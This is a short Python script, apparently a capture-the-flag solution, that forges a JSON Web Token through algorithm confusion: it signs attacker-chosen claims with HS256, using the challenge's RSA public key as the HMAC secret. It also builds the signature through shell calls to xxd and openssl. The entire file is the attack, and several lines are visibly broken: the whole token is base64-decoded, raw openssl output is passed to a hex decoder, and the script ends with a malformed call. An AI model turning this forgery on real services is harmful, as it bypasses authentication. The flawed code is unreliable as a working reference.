# Required Files:
# - token.jwt: initial token provided for the challenge
# - public.pem: public key provided for the challenge
import base64
import binascii
import jwt
import os

def nl():
    print("\n")

token = open('token.jwt','r').read()
print(f"JWT\n{token}")
nl()

decodedToken = base64.urlsafe_b64decode(token)
print("Decoded Token")
print(decodedToken)
nl()

public = open('public.pem','r').read()
print(f"Public Key\n{public}")
nl()

print("[*] Converting token to use public key for signing")
claims = {
        "iss": "Paradox",
        "iat": 1612055305,
        "exp": 1612055425,
        "data": {"pingu":"noots"}
}
newToken = jwt.encode(claims, key=public, algorithm='HS256').decode('utf-8')
with open('newtoken.jwt','w') as newTokenStore:
    newTokenStore.write(newToken)
    newTokenStore.close()

print(newToken)
nl()

print("Public Key as Hex")
publicKeyAsHex = os.popen("cat public.pem | xxd -p | tr -d \"\\n\"").read()
print(publicKeyAsHex)
nl()

print("Generating HMAC Signature")
# not sure if i need to .decode()?
signature = os.popen(f"echo -n {newToken} | openssl dgst -sha256 -mac HMAC -macopt hexkey:{publicKeyAsHex}").read()
print(signature)
nl()

signatureAsB64 = base64.urlsafe_b64encode(binascii.a2b_hex(signature)).replace('=','')
print(f"Encoded Signature\n{signatureAsB64}")
nl(())